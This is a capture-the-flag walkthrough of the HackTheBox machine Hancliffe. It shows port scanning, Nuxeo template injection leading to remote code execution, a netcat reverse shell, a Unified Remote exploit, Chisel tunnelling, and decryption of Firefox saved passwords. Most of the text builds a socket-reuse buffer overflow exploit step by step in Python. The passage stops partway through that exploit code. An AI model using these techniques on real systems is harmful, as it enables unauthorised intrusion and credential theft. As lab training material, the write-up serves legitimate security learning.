---
title: "Hancliffe - HackTheBox"
layout: single
excerpt: "This is a difficult machine, for the intrusion I take advantage of a 'Server Side Template Injection' to gain RCE, the privilege escalation consists of a Binary vulnerable to 'Buffer Overflow' but with a peculiarity, little space in the stack memory, so it is necessary to derive to a 'Socket Reuse'."
header:
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/69093629/158450041-084d4b20-ff4f-4955-994a-6b51137f779e.jpg"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:
  - Socket Reuse
  - ESP
  - Unified Remote
  - SSTI
---

![image](https://user-images.githubusercontent.com/69093629/158625865-b306cba7-e9e2-4544-b244-1ff4d0723b55.jpg)

I started with an Nmap scan for open ports.

```bash
┌──(root💀kali)-[/home/kali]
└─$ nmap -sS --min-rate 5000 -v -n -Pn -p- 10.10.11.115 -o nmap.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 04:53 EST
Initiating SYN Stealth Scan at 04:53
Scanning 10.10.11.115 [65535 ports]
Discovered open port 80/tcp on 10.10.11.115
Discovered open port 8000/tcp on 10.10.11.115
Discovered open port 9999/tcp on 10.10.11.115
Completed SYN Stealth Scan at 04:53, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.11.115
Host is up (0.044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
9999/tcp open  abyss

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
```

I made another one to identify the version of each service.

```bash
┌──(root💀kali)-[/home/kali]
└─$ nmap -sCV -p80,8000,9999 10.10.11.115 -o services.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 04:54 EST
Nmap scan report for 10.10.11.115
Host is up (0.056s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.21.0
8000/tcp open  http    nginx 1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
|_http-server-header: nginx/1.21.0
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
|     Welcome Brankas Application.
|     Username: Password:
|   NULL: 
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=3/12%Time=622C6DEE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,27,"Welcome\x20Brankas\x20Application\.\nUsername:\x20")%r(GetReques
SF:t,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(HTTPOptions,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pa
SF:ssword:\x20")%r(FourOhFourRequest,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20")%r(JavaRMI,31,"Welcome\x20Brankas\x20Ap
SF:plication\.\nUsername:\x20Password:\x20")%r(GenericLines,31,"Welcome\x2
SF:0Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(RTSPRequest,3
SF:1,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(
SF:RPCCheck,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password
SF::\x20")%r(DNSVersionBindReqTCP,31,"Welcome\x20Brankas\x20Application\.\
SF:nUsername:\x20Password:\x20")%r(DNSStatusRequestTCP,31,"Welcome\x20Bran
SF:kas\x20Application\.\nUsername:\x20Password:\x20")%r(Help,31,"Welcome\x
SF:20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(TerminalServ
SF:erCookie,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password
SF::\x20")%r(TLSSessionReq,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20")%r(Kerberos,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20")%r(SMBProgNeg,31,"Welcome\x20Brankas\x2
SF:0Application\.\nUsername:\x20Password:\x20")%r(X11Probe,31,"Welcome\x20
SF:Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(LPDString,31,"
SF:Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(LDA
SF:PSearchReq,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Passwo
SF:rd:\x20")%r(LDAPBindReq,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20")%r(SIPOptions,31,"Welcome\x20Brankas\x20Applicati
SF:on\.\nUsername:\x20Password:\x20")%r(LANDesk-RC,31,"Welcome\x20Brankas\
SF:x20Application\.\nUsername:\x20Password:\x20")%r(TerminalServer,31,"Wel
SF:come\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(NCP,31
SF:,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(N
SF:otesRPC,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:
SF:\x20")%r(WMSRequest,31,"Welcome\x20Brankas\x20Application\.\nUsername:\
SF:x20Password:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.32 seconds
```

The main page had the following:

![https://imgur.com/QVu20GJ.png](https://imgur.com/QVu20GJ.png)

`nginx`, nothing interesting, and through port `8000`:

![https://imgur.com/pUIBwny.png](https://imgur.com/pUIBwny.png)

It seemed to be some kind of password generator based on what you put into it, I gave it a try.

![https://imgur.com/M4OqzeN.png](https://imgur.com/M4OqzeN.png)

It generated a password for me, but it was of no use to me, I left it in the background and connected to port '9999' using `nc`.

![https://imgur.com/BJhrGTy.png](https://imgur.com/BJhrGTy.png)

It was an application that asked for credentials that it didn't have, so I resorted to fuzzing the main page and found the `maintentance` directory that caught my attention.

![https://imgur.com/jVQHWzg.png](https://imgur.com/jVQHWzg.png)

Accessing the resource via a *redirect* to a `404 Not Found`.

![image](https://user-images.githubusercontent.com/69093629/158074278-d0448566-7271-4265-9b25-c00a64879638.png)

Send a `GET` request to that resource to see the response headers.

![https://imgur.com/VtBaDIY.png](https://imgur.com/VtBaDIY.png)

The *redirect* is applied by the `Location` header, I tried to access a resource that does not exist with `..;` because `java` was running on the server and it might work.

![image](https://user-images.githubusercontent.com/69093629/158074567-f86e5dd8-90b9-44df-99c7-c451911f719c.png)

And yes, I don't apply the *redirect*, this caught my attention, so I tried to do *fuzzing* using `..;` and found many resources.

![https://imgur.com/fTVOduw.png](https://imgur.com/fTVOduw.png) 

`/login.jsp`, upon accessing it I found a *login* panel.

![https://imgur.com/lFPcD5L.png](https://imgur.com/lFPcD5L.png)

At the bottom was the `nuxeo` version, I did a little search for *exploits*.

![https://imgur.com/CMlGYZ1.png](https://imgur.com/CMlGYZ1.png)

This sent a `GET` request to a given path leveraging what appeared to be an `SSTI`.

![https://imgur.com/600N9F1.png](https://imgur.com/600N9F1.png)

I immediately tried to check if it was vulnerable.

![https://imgur.com/00IxCqb.png](https://imgur.com/00IxCqb.png)

And if it was vulnerable, it reported `14` in the error output.

![https://imgur.com/00IxCqb.png](https://imgur.com/00IxCqb.png)

Now I just needed to find a way to gain `RCE`, in *PayloadAllTheThings* I found malicious statements that allowed me to gain arbitrary code execution.

![image](https://user-images.githubusercontent.com/69093629/158074944-d67823a6-c860-4c2d-8d1b-8941951b10dc.png)

To verify this, I set `tcpdump` to listen for `ICMP` traces.

![https://imgur.com/2bSFUJ7.png](https://imgur.com/2bSFUJ7.png)

After receiving the `ICMP` traces I just needed to gain access to the machine, I opened a Python server hosting `nc64.exe` and downloaded it from the victim machine with `curl`, exporting it to `C:\programdata\`, since it had write capability.

![https://imgur.com/8AqlCuO.png](https://imgur.com/8AqlCuO.png)

Send another request establishing a `TCP` connection to me from the victim's `nc64.exe`.

![https://imgur.com/IX1RYc1.png](https://imgur.com/IX1RYc1.png)

And I gained access as user `svc_account`, changed to the root directory and there was the following.

![https://imgur.com/aizIIGt.png](https://imgur.com/aizIIGt.png)

Nothing out of the ordinary, I didn't have the ability to read the *flag* either, looking at the ports that were running internally on the machine, I found the following:

![https://imgur.com/gFhoGq9.png](https://imgur.com/gFhoGq9.png)

To list the ports by name and additional information, I used the following command in PowerShell:

![https://imgur.com/OGvrlik.png](https://imgur.com/OGvrlik.png)

I was running this binary that caught my attention on port `9511`, I left it in the background.

![https://imgur.com/6P7N8oQ.png](https://imgur.com/6P7N8oQ.png)

After a quick look at all the ports there were, there was one that after a quick Google search gave it away, port `9512`, I found an `Unified Remote` *exploit*.

![image](https://user-images.githubusercontent.com/69093629/158075856-e878de64-e70d-4af4-9c02-2ac474c2537a.png)

I had to pass him the IP of the vulnerable server, the port and a malicious binary, since this would make the `certutil` to download it and execute it.

![https://imgur.com/NzkjYiL.png](https://imgur.com/NzkjYiL.png)

Port `9512` was open internally so it could not be reached from outside, so I did a port forwarding with `Chisel`, opened a server on my machine.

![https://imgur.com/vi2CJsZ.png](https://imgur.com/vi2CJsZ.png)

And from the other machine I connected as a client to the server on port `8888`.

![https://imgur.com/7ehkGMC.png](https://imgur.com/7ehkGMC.png)

And I already had port `9512` accessible on my `localhost`, I verified it with `netstat -nat`.

![https://imgur.com/pqukMpB.png](https://imgur.com/pqukMpB.png)

Run the *exploit*.

![https://imgur.com/pgR0W4k.png](https://imgur.com/pgR0W4k.png)
 
And gain access to the machine as the `clara` user.

![https://imgur.com/m7hDmSQ.png](https://imgur.com/m7hDmSQ.png)

And I already had access to the user's *flag*.

![evqvQWe](https://user-images.githubusercontent.com/69093629/158076491-96248ecd-0f7a-40d1-81df-424b4897d963.jpg)

Enumerating carefully, I found two Firefox user directories.

![https://imgur.com/3bDNgkV.png](https://imgur.com/3bDNgkV.png)

The first one had nothing.

![https://imgur.com/MmCXphV.png](https://imgur.com/MmCXphV.png)

The other one had a lot of files and folders so I decided to download them to my machine, I opened an SMB server.

![https://imgur.com/796GNli.png](https://imgur.com/796GNli.png)

I copied the `ljftf853.default-release` directory to my drive with `copy -recurse ljftf853.default-release \\10.10.16.53\files`, it had a notable file called `logins.json`.

![https://imgur.com/j9YqIgA.png](https://imgur.com/j9YqIgA.png)

I had an *encryptedPassword* which I could decrypt if I had the file `key4.db` or `key3.db`, ​​which the former had, I used the tool `firepwd.py` for that, it allowed me to decrypt Mozilla protected passwords.

![https://imgur.com/bsThYSG.png](https://imgur.com/bsThYSG.png)

```python
┌──(root💀kali)-[/home/kali]
└─$ python3 firepwd.py -d ../ljftf853.default-release                                                   
globalSalt: b'9a30912b4d63331f8493789d7b0fce68520f9265'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'cda4b75c5041c6cc7114e053f012122ce92ada163d91df9306158a06d145998a'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'f8cea67900ed4b333ca56416f69a'
       }
     }
   }
   OCTETSTRING b'3f321c52f6534075d3d8915531d27df9'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'8d0ed50896869dc856de82150164a1390a953b67792edac2a62315625836ff08'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'76eba390fe01807925d822a071da'
       }
     }
   }
   OCTETSTRING b'cde74fae29c28c791794371b447180cabce01b6927bac73199f192e557136c36'
 }
clearText b'9efbbfd986fd5bef94b032679b7679d09b1f51891601b6e50808080808080808'
decrypting login/password pairs
http://localhost:8000:b'hancliffe.htb',b'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'
```

And within seconds I figured it out, there was another user on the system called `development`.

![https://imgur.com/Hkp5v0U.png](https://imgur.com/Hkp5v0U.png)

This was actually a hint, if we recall there was a password generation page, so I put these credentials and the user `development`.

![https://imgur.com/XMXafJq.png](https://imgur.com/XMXafJq.png)

The generated password could be used to authenticate through `winrm` using the user `development`, since it was within the group *Remote Management Users*, but it is not exposed, so I had to do another port forwarding of port '5985', I opened a server on my machine with `Chisel` through port `8888` and connected as a client from the victim machine.

![https://imgur.com/6GhBOVH.png](https://imgur.com/6GhBOVH.png)

Now, I authenticated with the `development` user using `winrm`.

![https://imgur.com/1HO6k3P.png](https://imgur.com/1HO6k3P.png)

<hr>
<h1 align="center"><b>ESCALADA DE PRIVILEGIOS</b></h1>

For escalation I remembered the binary running on port `9511` on the machine called `MyFirstApp.exe`.

![https://imgur.com/6P7N8oQ.png](https://imgur.com/6P7N8oQ.png)

I transferred it to my machine and did `reversing` with `ghidra`, there was a `_login` function with some credentials.

![https://imgur.com/21LQBve.png](https://imgur.com/21LQBve.png)

The password seemed to be in base64, I decoded it.

![https://imgur.com/C9M15RW.png](https://imgur.com/C9M15RW.png)

But it was of no use to me until I saw the *_encrypt1* and *_encrypt2* functions.

![https://imgur.com/rfJvtHv.png](https://imgur.com/rfJvtHv.png)

This is *_encrypt1*, it was replacing the first letter with the last and so on, the `atbash` encryption algorithm was being applied.

The second, this ROT47, replaces an ASCII character with the 47th character after it.

![https://imgur.com/dhCcMBy.png](https://imgur.com/dhCcMBy.png)

First I did the reverse process of Base64, then `atbash` and finally ROT47, this password remains.

![https://imgur.com/5JrBaoL.png](https://imgur.com/5JrBaoL.png)
![https://imgur.com/9T4jqCl.png](https://imgur.com/9T4jqCl.png)

Analyzing the binary further I found another function called *_SavedCreds*, this is used to store the credentials, the problem is that it uses `strcpy` to copy the *buffer* that is defined in *50 bytes*, this causes a buffer overflow.

![https://imgur.com/rh4YpkS.png](https://imgur.com/rh4YpkS.png)

Going into a little more detail in the *_login* function, I see that a connection is being established, a *socket* with *400 bytes* in length after entering something in a field called *Input Your Code*, this caught my attention, because if I connect to port `9999` from `nc` and use the credentials I have...

![https://imgur.com/DX2y69H.png](https://imgur.com/DX2y69H.png)

Exactly, this binary is the one running on port `9999` externally on the machine and is vulnerable to BoF, so I fed it a lot of A's and it corrupted it.

![https://imgur.com/6EilS5h.png](https://imgur.com/6EilS5h.png)

To take advantage of this I first exploited it locally, started `x32dbg` and the binary.

![image](https://user-images.githubusercontent.com/69093629/158053117-41a5e855-0822-4cdf-8c4c-500c2f376866.png)

I first created a special chain with `pattern_create` to find the *bytes* before overwriting *EIP*.

In the *exploit* I started by defining the `pwn` library to be able to interact with the binary, and `sys` to define the arguments that have to be passed to it, I also define a class called *Exploit* with an initializer to which I have passed three variables, which would be the user, the password and the name, and finally I define a method which is where the flow of the *exploit* will start.

```python
#!/usr/bin/python3

from pwn import *
from sys import argv

class Exploit():

	def __init__(self, user, password, name):

		self.__user = user
		self.__password = password
		self.__name = name

	def socket_reuse(self):
  
		r = remote("192.168.1.145", argv[1])

		r.sendlineafter(b"Username: ",self.__user)
		r.sendlineafter(b"Password: ",self.__password)
		r.sendlineafter(b"FullName:",self.__name)	
		r.sendlineafter(b"Input Your Code:",payload)
		sleep(1)
		r.sendline(buf)

autopwn = Exploit(b'alfiansyah', b'K3r4j@@nM4j@pAh!T', 'Vickry Alfiansyah')

def main():
	autopwn.socket_reuse()

if __name__ == '__main__':
	main()
```

I started by checking that the *exploit* worked fine.

![https://imgur.com/DjhCekr.png](https://imgur.com/DjhCekr.png)

The second thing I did was disable *DEP*, otherwise I wouldn't be able to execute instructions from the stack, this can be done from performance options.

![image](https://user-images.githubusercontent.com/69093629/158053356-f85bd4e2-26b6-4eee-8443-bd67148422a2.png)

Now I could continue, first with `pattern_create` I created a special chain telling it with how many *bytes* my program corrupts, I put 200, this is to know how many *bytes* to pass before overwriting *EIP*.

![https://imgur.com/59c7Dxy.png](https://imgur.com/59c7Dxy.png)

In the *script* I added the following line with the string generated by `pattern_create` in the `payload` variable.

```python
payload= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
```

After running the *exploit* this was the address that *EIP* had:

![image](https://user-images.githubusercontent.com/69093629/158053163-095e228b-5263-409d-8490-fcdcf1d467f1.png)

I copied and pasted it into `pattern_offset`.

![https://imgur.com/8QkhGlx.png](https://imgur.com/8QkhGlx.png)

There it is, the offset is 66 bytes before overwriting EIP. I tried sending 100 B with the following string updating the `payload` variable:

```python
payload = 100*"\xBB"
```

This was the result:

![image](https://user-images.githubusercontent.com/69093629/158054696-f4f21223-8294-49b9-b6bc-46fac2970c10.png)

As you can see, not all the Bs I have sent are there, this happens because the defined *buffer* is very limited, here we have a problem, since if we do not have enough space we will not be able to inject our `shellcode`, here I made use of a technique called *socket reuse*, it is based on the reuse of *sockets* to inject *shellcode*, since there is usually enough space to take advantage of.
The next step was to do a search for addresses containing `jmp esp` in the `push ebp` address.

![image](https://user-images.githubusercontent.com/69093629/158063903-6abcc2e7-94db-40a6-af83-f97e4def4077.png)

![image](https://user-images.githubusercontent.com/69093629/158054302-fedbe5c9-f3cb-455e-b34c-309e0894bfc3.png)

This was the result in the *References* tab.

![image](https://user-images.githubusercontent.com/69093629/158054325-56210e63-9237-4362-90ae-4a70cc74f91d.png)

I made a *breakpoint* at an address similar to the one in `push ebp`, in this case `719023A8`, this was going to serve as a "return address", I added it to the `payload` variable in *little endian*.

```python
payload = 66*"xBB" + p32(0x719023A8)
```

![image](https://user-images.githubusercontent.com/69093629/158064075-9759fa85-47a4-4593-b0aa-896a94c98826.png)

After an exploit run *ESP* became `023FFF18`, after hitting `Step Into` the address *ESP* was changed to *EIP*.

![image](https://user-images.githubusercontent.com/69093629/158204266-485fd528-bb37-4282-9885-8a2e3d228e08.png)

*EIP* was pointing to the end of my *bytes* and I had to make it point from the beginning so that the program flow would go down and pass through an address with the *socket* *buffer*. To do this what I did was open `nasm_shell.rb` and subtract *70 bytes* because the *buffer* is *66 bytes* + *4 bytes* of the address.

![image](https://camo.githubusercontent.com/4ea6db709a78753caa9c6bb36d61881023fcfc848f6d4cc86381f56f6216a42c/68747470733a2f2f696d6775722e636f6d2f4c4465456658432e706e67)

I added this *opcode* to the `payload` variable.

```python
payload = 66*"xBB" + p32(0x719023A8) + b"\xeb\xb8"
```

I already had *EIP* pointing to the beginning of my chain.

![image](https://user-images.githubusercontent.com/69093629/158063097-834bc72a-85fc-4e2a-b023-6614aebfc548.png)

The next step was to identify the socket's `recv` function and make a *breakpoint* when it makes the call.

![image](https://user-images.githubusercontent.com/69093629/158064764-801a1679-4d33-4b05-9e06-2fba17d5e5be.png)

I did this to see the address structure of the `recv` function.

![image](https://user-images.githubusercontent.com/69093629/158064829-e784b600-a774-4c47-b972-d98cc3c546cd.png)
 
The first address is the descriptor that identifies the *socket*, the second is the *buffer* to receive the data, in this case the *shellcode*, the third is the length, in this case *400 bytes* as we have seen with `ghidra` and the last are the *flags*, these addresses are interpreted from bottom to top so I had to adapt it to how they are, this can be seen better this way:

```c++
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
```

I did a `push` on *ESP* to push it to the very bottom of the stack and then I did a `pop` on `eax` to unpop *ESP* and have *EAX* have the address of *ESP*.

- This is what `push` and `pop` do

![Stack-sv](https://user-images.githubusercontent.com/69093629/158243788-f79f393a-3d76-4566-8de4-653e425c66eb.png)

I ran the program and it did the *push esp*.

![image](https://user-images.githubusercontent.com/69093629/158067158-c6ee094b-bd55-4d0f-bc0d-a93b62b49845.png)
 
The value I had in *EAX* was the following:

![image](https://user-images.githubusercontent.com/69093629/158067231-6083bdc4-d712-4e10-8719-d9ca33ac8d0a.png)
 
So now the value of *ESP* had to be at the end, that is, the last address of the stack.

![image](https://user-images.githubusercontent.com/69093629/158067243-76ff6958-8e91-4f6d-8fab-d425f14e0a84.png)
 
And now, after doing a `pop eax`, the address of *ESP* which is `023FFF28` was in the *EAX* register.

![image](https://user-images.githubusercontent.com/69093629/158067246-ead6c5e1-731d-43aa-b5ab-42718edce4b0.png)
 
I did all this so that I could perform arithmetic operations and input and output operations with this register. My idea was that the descriptor of the *socket* that was in position 60 was at the end of the stack, the last address, so I subtracted 60 from 18, since this must be appropriate for the *socket*.

![image](https://user-images.githubusercontent.com/69093629/158065231-14a2d3e1-59ed-4758-8fee-b64c8ec12404.png)

After doing `0x60 - 0x18` the result was `0x48`, but the result had a *null byte*, this should not be there because otherwise the *exploit* would not work as it should, to avoid this I did an addition of `0x230` because it did not have *null byte* and I subtracted `0x48`, the result was `0x1E8`, in this way the result did not have a null *byte* and behaved the same way.

![image](https://camo.githubusercontent.com/725da9cc3eded4dace28def1c8ba625b63fe18697fa91232b5a17aec8c93cdc7/68747470733a2f2f696d6775722e636f6d2f7a3970703457752e706e67)

In the *script* I had the *opcode* that subtracted 70 to position *ESP* (acts as a "return address") at the beginning of the A's and the *opcode* of `push esp` and `pop eax`, these in the variable `recv`.
The `payload` variable does the calculations, adding `recv` to the remaining string in A after subtracting the 66 bytes from the length of `recv` and then adding the address of `jmp esp` to the opcodes.

```python
recv = b""
recv += b"\x54" 				          # -> push esp
recv += b"\x58" 				          # -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8

payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```

Now, the value of the *socket* descriptor had to be stored in a register in order to be able to call it later, in this case *ESI*, what I did was move the value of *EAX* that now contained the address of the *socket* descriptor to *ESI*.

![image](https://camo.githubusercontent.com/a62946076fea31cbfa323bdda18d8096476cdf506e8a34ae1f4a384e6a2fe480/68747470733a2f2f696d6775722e636f6d2f527142656a67792e706e67)

I entered the *opcode* in the *exploit* in the `recv` variable.

```python
recv += b"\x8b\x30" # -> mov esi, [eax]
```
Run the *exploit* and *EAX* had the address where the *socket* descriptor was, `024BFF60`.

![image](https://user-images.githubusercontent.com/69093629/158068089-76ebeb6d-c46d-4810-9f03-8d6652b52ef3.png)
 
After doing a `Step Into` I had already stored the descriptor in *ESI*, I already had the *socket* descriptor done, now I only had the *buffer*, the length and the *flags* left, but I had a small problem, *EIP* will go down where it can meet *ESP*, this could cause problems.

![image](https://user-images.githubusercontent.com/69093629/158068152-32692d42-6f81-4c98-b351-7c4f5eadccab.png)
 
To fix this I simply subtracted 70 bytes from `ESP`.

![image](https://camo.githubusercontent.com/2a54af66cd0aa62eea60c0cd3322c17940f686f2456736bed2e705fb02e3d096/68747470733a2f2f696d6775722e636f6d2f346d59664771582e706e67)
 
I did this so that I position *ESP* above *EIP* and there would be no problems when *EIP* interprets downwards.

![image](https://user-images.githubusercontent.com/69093629/158068284-575dc5f1-f4b5-4265-8905-a2da779ee1e4.png)
 
I continued with the *flags*, this value had `0x00000000`, I could use *EBX* to store it, I did an `xor` to `ebx` because it results in 0 and I also did a `push` to *EBX* to stack it at the end.

![image](https://camo.githubusercontent.com/18e173f11ab4a482c711010899765142fc08c9a520c8bcb04f16331f94ff2391/68747470733a2f2f696d6775722e636f6d2f6c5276424c61652e706e67)
![image](https://user-images.githubusercontent.com/69093629/158069004-859a1247-80bd-4350-a519-10eb2e71539d.png)
  
Now I could simply add 410 bytes to *EBX* to make the length, since it's 0, and push *EBX* again to push the length to the end of the stack.

![image](https://camo.githubusercontent.com/7fa632f856ba659e084e99a805d0cd3c3df2c746dbbd723c5b339a43a0c8347b/68747470733a2f2f696d6775722e636f6d2f324a595a676c732e706e67)

![image](https://user-images.githubusercontent.com/69093629/158069237-bcd5bae8-5aa8-4d10-8782-77974a5c79ea.png)
 
This is how the *exploit* was looking.

```python
recv = b""
recv += b"\x54" 				# -> push esp
recv += b"\x58" 				# -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
recv += b"\x31\xdb" 				# -> xor ebx, ebx
recv += b"\x53" 				# -> push ebx 
recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
recv += b"\x53" 				# -> push ebx

payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```

Since I had subtracted 70 *bytes* in the *ESP*, I made *EBX* have the value of *ESP* to add 70 *bytes* back to *EBX* and fall at an intermediate point where my A's are, there I will put NOPS so that the flow of the program goes smoothly to *EBX* which will be pointing to the *socket* function `recv`, which will contain enough space to store the *shellcode*.

![image](https://camo.githubusercontent.com/6651c05abecefe0cbf059369452cf60482f710663713130d10c1c003d717f44d/68747470733a2f2f696d6775722e636f6d2f4b3975394e50552e706e67)
![image](https://camo.githubusercontent.com/e7dc879292922fb5ebb1d8a4c76ef811f6a5cbaffeb044edc132c73faeefa7cf/68747470733a2f2f696d6775722e636f6d2f374d324835366b2e706e67)
 
*EBX* already had the same address as *ESP*.
 
![image](https://user-images.githubusercontent.com/69093629/158069787-a0f86e9f-4b23-4322-9531-2a4c6e9400ff.png)
 
I did a `Step Info` and the sum of the 70 *bytes* was applied, so *EBX* was already somewhere in the middle of the A's.

![image](https://user-images.githubusercontent.com/69093629/158069800-9f65129c-07de-4226-abe7-9ca123a0553e.png)
  
The *exploit* was looking like this:

```python
recv = b""
recv += b"\x54" 				# -> push esp
recv += b"\x58" 				# -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
recv += b"\x31\xdb" 				# -> xor ebx, ebx
recv += b"\x53" 				# -> push ebx 
recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
recv += b"\x53" 				# -> push ebx
recv += b"\x54"					# -> push esp	
recv += b"\x5b"					# -> pop ebx
recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
recv += b"\x53"					# -> push ebx

payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```
Now I simply did a `push ebx` containing the buffer and a `push esi` containing the socket descriptor.

![image](https://camo.githubusercontent.com/d636659a35f69f53c2bb322cb29c2ecd9341b90ca4a66daa2e8eac6fe6231e3b/68747470733a2f2f696d6775722e636f6d2f506e5a416d4c5a2e706e67)
 
I ran the *exploit* with the new values ​​and this was the result:

![image](https://user-images.githubusercontent.com/69093629/158071328-48556507-c6ff-409a-8d34-4f81b018276b.png)
 
Perfect! I already had all the corresponding values ​​appropriate to the *socket*, the only thing left was to make the call, for which I needed the address of the *socket*, which I extracted from `ghidra`.
 
![image](https://camo.githubusercontent.com/f1e10cc2ed963a914acd3f9c149da295fdfcf14b55c7dbc33b50194e3616903a/68747470733a2f2f696d6775722e636f6d2f74457a547946692e706e67)
  
I put this address in *EAX* with `mov eax, [0x719082ac]` and made a call to *EAX*.

![image](https://camo.githubusercontent.com/8f6c8bc1fd2b505f32ba4d2d7272e84cf2deb3938c00554871402cd3eea4c035/68747470733a2f2f696d6775722e636f6d2f36346d566375312e706e67)

I converted the A's to NOPS and this is what the *exploit* looked like.

```python
recv = b""
recv += b"\x54" 				# -> push esp
recv += b"\x58" 				# -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
recv += b"\x31\xdb" 				# -> xor ebx, ebx
recv += b"\x53" 				# -> push ebx
recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
recv += b"\x53" 				# -> push ebx
recv += b"\x54"					# -> push esp
recv += b"\x5b"					# -> pop ebx
recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
recv += b"\x53"					# -> push ebx
recv += b"\x56" 				# -> push esi
